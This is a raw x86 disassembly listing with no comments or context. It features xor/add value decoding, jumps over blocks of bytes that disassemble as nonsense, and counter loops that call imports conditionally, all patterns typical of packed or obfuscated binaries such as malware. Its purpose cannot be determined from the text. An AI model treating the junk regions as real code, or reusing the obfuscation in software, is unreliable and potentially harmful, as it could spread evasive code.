  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fce9,0x42fcd5
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fce9
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx+0xc87d044]
  40e122:	inc    edi
  40e123:	sub    BYTE PTR [eax-0x5a],0x70
  40e127:	jo     0x40e0ec
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e14a
  40e12d:	cmp    al,0x87
  40e12f:	outs   dx,BYTE PTR ds:[esi]
  40e130:	cli    
  40e131:	push   ebp
  40e132:	ins    DWORD PTR es:[edi],dx
  40e133:	dec    ebx
  40e134:	dec    esp
  40e135:	into   
  40e136:	pop    edx
  40e137:	(bad)  
  40e139:	sub    eax,0x64
  40e13c:	push   0x12291d20
  40e141:	sbb    edi,0xffffffd7
  40e144:	xchg   ecx,eax
  40e145:	sub    eax,0xf3348159
  40e14a:	push   es
  40e14b:	sahf   
  40e14c:	and    ebp,DWORD PTR [ebp+0x1d9e5580]
  40e152:	pop    ebx
  40e153:	inc    ebp
  40e154:	clc    
  40e155:	std    
  40e156:	mov    bl,0x2b
  40e158:	bnd jno 0x40e0fd
  40e15b:	mov    al,0x5c
  40e15d:	test   BYTE PTR [edx+0x1d34385b],ah
  40e163:	push   ds
  40e164:	cmp    DWORD PTR ds:0x3bf55abb,0x76
  40e16b:	xor    BYTE PTR [ecx],al
  40e16d:	ss pop es
  40e16f:	or     eax,0xf986dc9d
  40e174:	jbe    0x40e117
  40e176:	or     al,0x58
  40e178:	ss mov esp,0x6e6689f
  40e17e:	sahf   
  40e17f:	repz fs fsub st(4),st
  40e183:	std    
  40e184:	call   0x1260:0x7899afba
  40e18b:	(bad)  
  40e18c:	std    
  40e18d:	test   al,0x50
  40e18f:	add    al,0xde
  40e191:	mov    ds:0xf9956931,al
  40e196:	ret    0x7566
  40e199:	and    BYTE PTR [esp+esi*2-0x64],ah
  40e19d:	in     al,dx
  40e19e:	and    ch,BYTE PTR [eax]
  40e1a0:	call   0xe2a19a31
  40e1a5:	in     eax,0x3a
  40e1a7:	jno    0x40e1e3
  40e1a9:	mov    al,0xdd
  40e1ab:	fimul  DWORD PTR [ecx]
  40e1ad:	mov    ch,0x9c
  40e1af:	dec    ecx
  40e1b0:	das    
  40e1b1:	or     ch,BYTE PTR [ebx+0x3]
  40e1b4:	scas   al,BYTE PTR es:[edi]
  40e1b5:	dec    ebx
  40e1b6:	pop    esi
  40e1b7:	xchg   esp,eax
  40e1b8:	(bad)  
  40e1b9:	sbb    al,0x3e
  40e1bb:	cs push ebx
  40e1bd:	dec    ebx
  40e1be:	cmp    esi,esi
  40e1c0:	stc    
  40e1c1:	or     eax,0xfba9a4cf
  40e1c6:	xor    DWORD PTR [ecx+0x39],0x50
  40e1ca:	mov    ebx,0x3ab2ad25
  40e1cf:	sub    al,0x76
  40e1d1:	and    DWORD PTR [ebx+0x32],edi
  40e1d4:	std    
  40e1d5:	or     ebp,DWORD PTR [esi-0x39]
  40e1d8:	cmp    eax,0x4b01b87
  40e1dd:	xchg   esp,eax
  40e1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1df:	xlat   BYTE PTR ds:[ebx]
  40e1e0:	inc    edi
  40e1e1:	mov    esi,0xea5a6433
  40e1e6:	aad    0x6a
  40e1e8:	jl     0x40e177
  40e1ea:	xchg   ebp,eax
  40e1eb:	xchg   BYTE PTR [ebx+ecx*8+0x7],al
  40e1ef:	stos   DWORD PTR es:[edi],eax
  40e1f0:	mov    edx,0xb1606a75
  40e1f5:	xor    eax,0xba0d34fb
  40e1fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1fb:	cdq    
  40e1fc:	int    0xc
  40e1fe:	in     al,dx
  40e1ff:	dec    edx
  40e200:	sbb    al,0xb8
  40e202:	jo     0x40e187
  40e204:	sahf   
  40e205:	or     al,0xb6
  40e207:	add    eax,0xb5cd11b3
  40e20c:	lahf   
  40e20d:	mov    cl,0x2a
  40e210:	mov    cl,0x88
  40e212:	cdq    
  40e213:	imul   edx,DWORD PTR [ecx+0x49],0x83848032
  40e21a:	jmp    0xb4b615e4
  40e21f:	lea    ebx,[ecx]
  40e221:	pushf  
  40e222:	out    0x75,eax
  40e224:	arpl   WORD PTR [ebp+eax*8-0x6c051e2c],di
  40e22b:	cmp    BYTE PTR [esi-0x22a688d7],bh
  40e231:	sahf   
  40e232:	adc    eax,0xee500be8
  40e237:	bound  esi,QWORD PTR [edi]
  40e239:	xchg   ecx,eax
  40e23a:	(bad)  
  40e23b:	mov    ecx,0x7b398661
  40e240:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e241:	and    eax,0xffbf80fc
  40e246:	xor    eax,0x53013486
  40e24b:	xor    al,0x82
  40e24d:	std    
  40e24e:	mov    ebx,ebx
  40e250:	std    
  40e251:	sbb    eax,DWORD PTR [eax-0x21]
  40e254:	(bad)  
  40e256:	sbb    eax,0x86b9cf84
  40e25b:	or     dl,bl
  40e25d:	in     eax,dx
  40e25e:	shl    edx,0xb4
  40e261:	xchg   esp,eax
  40e262:	int3   
  40e263:	mov    dh,0x53
  40e265:	repz push eax
  40e267:	sub    eax,0x798c0e8e
  40e26c:	sahf   
  40e26d:	inc    ecx
  40e26e:	(bad)  [ecx]
  40e270:	add    esp,DWORD PTR [eax-0x7cca5316]
  40e276:	pop    esp
  40e277:	mov    dh,0xa6
  40e279:	mov    DWORD PTR [ecx],eax
  40e27b:	lea    eax,[ebp-0x4]
  40e27e:	and    DWORD PTR ds:0x42fcfd,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e295:	cmp    DWORD PTR ds:0x42fcfd,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e563
  40e2b0:	cmp    DWORD PTR ds:0x42fcfd,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fcfd
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fcfd,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fcfd,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fd6e,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fd6e,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fd6e,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd01
  40e315:	call   DWORD PTR ds:0x42e477
  40e31b:	cmp    DWORD PTR ds:0x42fd6e,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fd6e
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fd6e,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e794
  40e340:	mov    ecx,DWORD PTR ds:0x42e79c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fd72,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	mov    ah,0x59
  40e378:	(bad)  
  40e379:	call   0x70b187b9
  40e37e:	ret    
  40e37f:	jg     0x40e3f1
  40e381:	jo     0x40e36f
  40e383:	repz out 0x81,eax
  40e386:	mov    ss,WORD PTR [ebp-0x2eb2f411]
  40e38c:	push   0xffffff9d
  40e38e:	outs   dx,BYTE PTR ds:[esi]
  40e38f:	inc    ebx
  40e390:	outs   dx,BYTE PTR ds:[esi]
  40e391:	addr16 aaa 
  40e393:	xor    DWORD PTR [edi-0x2c],ecx
  40e396:	mov    ds:0x742c41a,al
  40e39b:	cmc    
  40e39c:	fcomp  DWORD PTR [ebx+0x64]
  40e39f:	dec    BYTE PTR [esi+eiz*8]
  40e3a2:	aas    
  40e3a3:	call   0xb0da:0x7ec6abca
  40e3aa:	pusha  
  40e3ab:	mov    bh,0x33
  40e3ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3ae:	(bad)  
  40e3af:	iret   
  40e3b0:	mov    ch,0x94
  40e3b2:	jmp    0xb20e:0x6a36af46
  40e3b9:	and    DWORD PTR [edi-0xce78c6e],ebp
  40e3bf:	bound  ebp,QWORD PTR [edx+ecx*1]
  40e3c2:	mov    al,0x2d
  40e3c4:	loopne 0x40e3a3
  40e3c6:	xlat   BYTE PTR ds:[ebx]
  40e3c7:	sub    edi,DWORD PTR [ebx+0x5b0020bf]
  40e3cd:	int3   
  40e3ce:	ret    0xc324
  40e3d1:	movntps XMMWORD PTR [ebx],xmm7
  40e3d4:	cwde   
  40e3d5:	cmp    al,0xc2
  40e3d7:	test   al,0x79
  40e3d9:	mov    dh,0x72
  40e3db:	pop    eax
  40e3dc:	push   ecx
  40e3dd:	mov    ebx,0xa8faac6b
  40e3e2:	adc    DWORD PTR [edx],0x41a53c5f
  40e3e8:	and    BYTE PTR [edi],cl
  40e3ea:	mov    ebp,0x760b182b
  40e3ef:	xchg   edx,eax
  40e3f0:	sub    BYTE PTR [edx-0xa59be0c],0xfb
  40e3f7:	adc    esp,esp
  40e3f9:	lahf   
  40e3fa:	or     DWORD PTR [ecx-0x51],0x4f
  40e3fe:	mov    dl,0xc2
  40e400:	test   eax,edx
  40e402:	xlat   BYTE PTR ds:[ebx]
  40e403:	mov    cl,BYTE PTR [ebp+0x7d]
  40e406:	dec    esp
  40e407:	push   edx
  40e408:	jns    0x40e46f
  40e40a:	mov    edx,0xb8c5f4e3
  40e40f:	sahf   
  40e410:	add    cl,BYTE PTR [ebp+0x66fdbfe1]
  40e416:	shl    DWORD PTR [esi+0x5101d315],1
  40e41c:	and    BYTE PTR es:[ebx],dl
  40e41f:	jns    0x40e3fb
  40e421:	shr    DWORD PTR [ebp-0x5168a426],1
  40e427:	mov    dh,0xed
  40e429:	mov    ds:0x2e7434c4,eax
  40e42e:	int3   
  40e42f:	leave  
  40e430:	shl    edi,1
  40e432:	pop    esp
  40e433:	dec    esi
  40e434:	jge    0x40e40a
  40e436:	sub    BYTE PTR [esi],bh
  40e438:	push   edx
  40e439:	pushf  
  40e43a:	(bad)  
  40e43c:	sub    BYTE PTR ds:0x38a37f25,0x67
  40e443:	sar    DWORD PTR [eax-0x3dbfb34d],cl
  40e449:	jge    0x40e41c
  40e44b:	pop    ebp
  40e44c:	mov    bh,0x24
  40e44e:	add    eax,0x68242bc7
  40e453:	push   0x1a
  40e455:	and    dh,BYTE PTR [edi-0x2]
  40e458:	push   0x651c6bc0
  40e45d:	ss push 0x36
  40e460:	mov    BYTE PTR [ebx],bh
  40e462:	jb     0x40e4e2
  40e464:	mov    DWORD PTR [ebx],ecx
  40e466:	std    
  40e467:	jno    0x40e4d1
  40e469:	ss sub bh,bh
  40e46c:	xchg   DWORD PTR [eax],edi
  40e46e:	jmp    0x40e404
  40e470:	sbb    dl,BYTE PTR [esi-0x20]
  40e473:	shl    edx,1
  40e475:	xabort 0xed
  40e478:	mov    ds:0x5a046473,eax
  40e47d:	ja     0x40e48f
  40e47f:	add    eax,DWORD PTR [esi+edx*4-0x1a]
  40e483:	sub    BYTE PTR [ebx-0x70],al
  40e486:	mov    bh,0x68
  40e488:	jle    0x40e47a
  40e48a:	mov    ds:0x8a029e34,al
  40e48f:	loopne 0x40e4f6
  40e491:	jo     0x40e4a0
  40e493:	jle    0x40e444
  40e495:	ficom  WORD PTR [ebx+0x1]
  40e498:	ins    DWORD PTR es:[edi],dx
  40e499:	mov    eax,0x698974e3
  40e49e:	push   esi
  40e49f:	loop   0x40e465
  40e4a1:	dec    edx
  40e4a2:	cmp    edx,esp
  40e4a4:	sub    esp,DWORD PTR [edi+0x57]
  40e4a7:	mov    esi,0x6787902a
  40e4ac:	packsswb mm6,QWORD PTR [eax]
  40e4af:	dec    ebp
  40e4b0:	test   eax,0xaa86f48e
  40e4b5:	out    0xa3,eax
  40e4b7:	arpl   di,cx
  40e4b9:	lock popf 
  40e4bb:	outs   dx,DWORD PTR ds:[esi]
  40e4bc:	add    ebp,DWORD PTR [ebp+0x7a]
  40e4bf:	je     0x40e467
  40e4c1:	imul   ecx,DWORD PTR [esi-0x24],0xffffffbf
  40e4c5:	cdq    
  40e4c6:	or     eax,0x22145ffb
  40e4cb:	loope  0x40e466
  40e4cd:	nop
  40e4ce:	add    eax,0x31e845c7
  40e4d3:	test   DWORD PTR [eax+edi*8+0x399ae381],ebx
  40e4da:	add    BYTE PTR [eax],al
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x32ca740f
  40e4f5:	imul   eax,edi,0xffffff8e
  40e4f8:	mov    ds:0x7fc37070,eax
  40e4fd:	jo     0x40e56f
  40e4ff:	cmp    ebx,ecx
  40e501:	out    dx,al
  40e502:	jle    0x40e487
  40e504:	ins    BYTE PTR es:[edi],dx
  40e505:	and    cl,BYTE PTR [ebx]
  40e507:	fiadd  DWORD PTR [esi+0x11bb87e6]
  40e50d:	out    dx,eax
  40e50e:	in     eax,0x14
  40e510:	pushf  
  40e511:	into   
  40e512:	(bad)  
  40e513:	jns    0x40e4b4
  40e515:	fmul   QWORD PTR [esi-0x2355435]
  40e51b:	and    BYTE PTR [eax+edi*4+0x3b],bh
  40e51f:	bound  esi,QWORD PTR [esi+ebx*2+0x29543ea9]
  40e526:	hlt    
  40e527:	ja     0x40e56b
  40e529:	adc    eax,0x55f10add
  40e52e:	lock adc cl,BYTE PTR [esi]
  40e531:	sub    ebx,DWORD PTR [ebx]
  40e533:	frstor [ebx]
  40e535:	pop    ebx
  40e536:	adc    eax,0x53dbbbfa
  40e53b:	ins    DWORD PTR es:[edi],dx
  40e53c:	pop    edx
  40e53d:	add    dl,BYTE PTR [edx]
  40e53f:	inc    eax
  40e540:	hlt    
  40e541:	and    BYTE PTR [ebx+0x28],al
  40e544:	ss cs stos BYTE PTR es:[edi],al
  40e547:	les    eax,FWORD PTR [edx-0x33]
  40e54a:	add    eax,0x99568d06
  40e54f:	out    dx,ax
  40e551:	cmp    BYTE PTR [ecx+eax*8],bh
  40e554:	mov    edx,esp
  40e556:	dec    edx
  40e557:	jne    0x40e557
  40e559:	jae    0x40e52e
  40e55b:	mov    eax,ds:0x67518b40
  40e560:	mov    eax,ds:0x565962f2
  40e565:	mov    edx,0x2c51c6cd
  40e56a:	push   0xffffffec
  40e56c:	addr16 dec edi
  40e56e:	or     eax,0x1e7b3c03
  40e573:	nop
  40e574:	inc    edi
  40e575:	or     al,0x1f
  40e577:	pusha  
  40e578:	ret    
  40e579:	dec    esi
  40e57a:	sahf   
  40e57b:	mov    ds:0xdddb6ebb,al
  40e580:	daa    
  40e581:	and    al,0x7
  40e583:	popf   
  40e584:	and    eax,ebp
  40e586:	sub    DWORD PTR [edx+0x3d6e49aa],ecx
  40e58c:	dec    eax
  40e58d:	loop   0x40e582
  40e58f:	pop    ebp
  40e590:	push   cs
  40e591:	sahf   
  40e592:	les    esp,FWORD PTR [esi]
  40e594:	jmp    DWORD PTR [esi+0x6a]
  40e597:	(bad)  
  40e598:	aad    0xb8
  40e59a:	cmp    ecx,ebx
  40e59c:	das    
  40e59d:	mov    eax,ds:0x6a825dcb
  40e5a2:	or     BYTE PTR [ebp+0x15],al
  40e5a5:	jae    0x40e60f
  40e5a7:	mov    ecx,0xe6f7ae3c
  40e5ac:	retf   
  40e5ad:	dec    edi
  40e5ae:	aad    0xe1
  40e5b0:	retf   
  40e5b1:	retf   0xcf57
  40e5b4:	aaa    
  40e5b5:	mov    cs,WORD PTR ds:0xa4a5145d
  40e5bb:	aaa    
  40e5bc:	adc    esp,DWORD PTR [edx-0x80]
  40e5bf:	fistp  DWORD PTR [ebx]
  40e5c1:	cmp    ch,BYTE PTR ds:0xe9f126ee
  40e5c7:	dec    esp
  40e5c8:	adc    DWORD PTR [esi+eiz*8-0x5a],0xdfe4cc88
  40e5d0:	repz loope 0x40e619
  40e5d3:	in     al,dx
  40e5d4:	leave  
  40e5d5:	fcomp  DWORD PTR ds:0x11e58d9a
  40e5db:	lods   eax,DWORD PTR ds:[esi]
  40e5dc:	fwait
  40e5dd:	jge    0x40e642
  40e5df:	mov    dh,0x69
  40e5e1:	mov    ah,0x75
  40e5e3:	jg     0x40e599
  40e5e5:	xchg   ebx,eax
  40e5e6:	repnz sbb DWORD PTR [edi+0x26],esi
  40e5ea:	mov    bl,0xed
  40e5ec:	icebp  
  40e5ed:	mov    eax,ds:0xa49481a8
  40e5f2:	stos   BYTE PTR es:[edi],al
  40e5f3:	xchg   ebx,eax
  40e5f4:	and    BYTE PTR [ebp+0x4c],ah
  40e5f7:	enter  0x2371,0x9f
  40e5fb:	cdq    
  40e5fc:	inc    esi
  40e5fd:	or     al,bh
  40e5ff:	ins    DWORD PTR es:[edi],dx
  40e600:	add    ebp,DWORD PTR ds:0xb93b5c3d
  40e606:	ret    
  40e607:	pop    esp
  40e608:	mov    WORD PTR [ebx-0x7724a1ef],es
  40e60e:	aad    0xdd
  40e610:	inc    esi
  40e611:	cdq    
  40e612:	dec    esi
  40e613:	cmp    al,BYTE PTR [ebp-0x516b632f]
  40e619:	adc    ch,BYTE PTR [ebx-0x66fa99e1]
  40e61f:	sub    BYTE PTR [esp+edi*4-0x51aacf91],cl
  40e626:	xor    eax,0x74e58a38
  40e62b:	push   edx
  40e62c:	sahf   
  40e62d:	push   edx
  40e62e:	and    ebx,DWORD PTR [esi]
  40e630:	scas   eax,DWORD PTR es:[edi]
  40e631:	lock pop ecx
  40e633:	push   edi
  40e634:	xor    al,0xa1
  40e636:	cmp    DWORD PTR [ebp+edx*4-0x481bfbf2],edx
  40e63d:	test   al,0xf3
  40e63f:	loope  0x40e61b
  40e641:	adc    al,0x41
  40e643:	dec    ebx
  40e644:	(bad)  
  40e645:	loopne 0x40e618
  40e647:	(bad)  
  40e648:	fsub   st,st(0)
  40e64a:	pop    ebx
  40e64b:	dec    eax
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fd7a,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fd7a
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fd7a,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fd7a,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fd7a,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e47b
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e11c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd01,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fcd9,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	jo     0x40e6f2
  40e6dc:	pop    edx
  40e6dd:	adc    DWORD PTR [ecx-0x5e],0x7fc37070
  40e6e4:	jo     0x40e756
  40e6e6:	jnp    0x40e6d9
  40e6e8:	fwait
  40e6e9:	adc    BYTE PTR [ebp-0xb],ah
  40e6ec:	cli    
  40e6ed:	push   eax
  40e6ee:	jns    0x40e6fa
  40e6f0:	rol    BYTE PTR [edx],0xe2
  40e6f3:	sti    
  40e6f4:	in     eax,0x97
  40e6f6:	jecxz  0x40e718
  40e6f8:	in     al,dx
  40e6f9:	fmul   DWORD PTR [esi]
  40e6fb:	inc    eax
  40e6fc:	or     DWORD PTR [ecx+0x1899e732],edi
  40e702:	xor    BYTE PTR [edi],al
  40e704:	test   BYTE PTR [edx+edx*1-0x23],dh
  40e708:	js     0x40e765
  40e70a:	dec    ebp
  40e70b:	mov    ebx,DWORD PTR [edi+0x77]
  40e70e:	fwait
  40e70f:	int3   
  40e710:	into   
  40e711:	mov    di,0x7185
  40e715:	jbe    0x40e768
  40e717:	jmp    0x101613f9
  40e71c:	mov    ecx,0x35b69542
  40e721:	mov    ch,0xe6
  40e723:	adc    al,0x5
  40e725:	gs sbb ah,dh
  40e728:	sbb    ebp,DWORD PTR cs:[esi+0x3ec93780]
  40e72f:	jno    0x40e73b
  40e731:	shr    BYTE PTR [ebp+0x42],1
  40e734:	mov    edx,DWORD PTR [esi+0x5d]
  40e737:	sbb    dh,ch
  40e739:	cmp    DWORD PTR [eax+eiz*1-0x2a1a2ad0],ebx
  40e740:	xor    DWORD PTR [ebx],ecx
  40e742:	jecxz  0x40e764
  40e744:	push   cs
  40e745:	call   0x2d69:0xfe53d54
  40e74c:	push   es
  40e74d:	or     al,ch
  40e74f:	xor    DWORD PTR [edi],0xffffffa0
  40e752:	mov    al,0x44
  40e754:	sbb    ah,BYTE PTR [esi+esi*4+0x63d9173b]
  40e75b:	fcomp  QWORD PTR [edi-0x23]
  40e75e:	pop    edi
  40e75f:	cmp    BYTE PTR [ecx],ch
  40e761:	int3   
  40e762:	aam    0x7c
  40e764:	int    0x6f
  40e766:	test   ebx,esi
  40e768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e769:	in     al,dx
  40e76a:	mov    ah,0x1c
  40e76c:	jmp    0xba80:0x410d93df
  40e773:	xor    bh,BYTE PTR [ebx-0xfbaffea]
  40e779:	sub    bh,0x7d
  40e77c:	mov    esi,0xcd3461e
  40e781:	and    DWORD PTR [eax+0x506ff1d8],eax
  40e787:	dec    edi
  40e788:	popf   
  40e789:	test   dl,bl
  40e78b:	jmp    0xdfab:0x421bc0b1
  40e792:	xor    eax,DWORD PTR [edi+0x13db21ac]
  40e798:	pop    es
  40e799:	pop    ss
  40e79a:	imul   ebp,ebx,0xffffffc8
  40e79d:	xor    al,0x49
  40e79f:	push   esp
  40e7a0:	xor    DWORD PTR [esi-0x37],ebp
  40e7a3:	cwde   
  40e7a4:	ret    0x7008
  40e7a7:	aaa    
  40e7a8:	sbb    al,0xc6
  40e7aa:	cdq    
  40e7ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7ac:	mov    ch,0xb2
  40e7ae:	cmp    al,cl
  40e7b0:	int    0xc2
  40e7b2:	fcomp  DWORD PTR [esi-0x120a1312]
  40e7b8:	xchg   esp,eax
  40e7b9:	mov    eax,0x42821aa8
  40e7be:	pusha  
  40e7bf:	cmp    eax,0xba8dd3b3
  40e7c4:	push   esp
  40e7c5:	ror    DWORD PTR [esi],1
  40e7c7:	nop
  40e7c8:	repz adc edi,ecx
  40e7cb:	cmp    DWORD PTR [eax+edx*4-0x1820f2d4],ebx
  40e7d2:	imul   ebx,DWORD PTR [ebp+0x5f],0xcb438ea9
  40e7d9:	mov    dl,0x5d
  40e7db:	and    DWORD PTR [ecx],0x808eae89
  40e7e1:	inc    eax
  40e7e2:	mov    ah,0xdd
  40e7e4:	jmp    0x40e78a
  40e7e6:	and    eax,0x9b82125f
  40e7eb:	mov    ebp,0xee3e68ce
  40e7f0:	sub    eax,0x51566a66
  40e7f5:	push   ss
  40e7f6:	cli    
  40e7f7:	call   0xfb7f37b2
  40e7fc:	cmc    
  40e7fd:	pop    ecx
  40e7fe:	sbb    dh,ch
  40e800:	push   ebx
  40e801:	lock sub cl,dh
  40e804:	mov    WORD PTR [edx],?
  40e806:	push   0xffffff99
  40e808:	int3   
  40e809:	ret    0x277e
  40e80c:	mov    DWORD PTR [eax+0x79cdbbaf],eax
  40e812:	inc    ebp
  40e813:	aaa    
  40e814:	icebp  
  40e815:	sbb    bh,BYTE PTR [ebp-0xf]
  40e818:	xchg   esi,eax
  40e819:	jmp    0x72cc2268
  40e81e:	iret   
  40e81f:	iret   
  40e820:	xor    cl,BYTE PTR [ecx+0x11578802]
  40e826:	(bad)
  40e829:	sbb    DWORD PTR [edx-0x1e],0x40d5c95b
  40e830:	nop
  40e831:	jbe    0x40e85c
  40e833:	mov    eax,DWORD PTR [eax]
  40e835:	adc    DWORD PTR ds:0x42fce9,0x5067
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd0d,0x42fd7e
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fce1
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e11c,0x42e6ef
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e70b,0x57ad
  40e885:	add    eax,edi
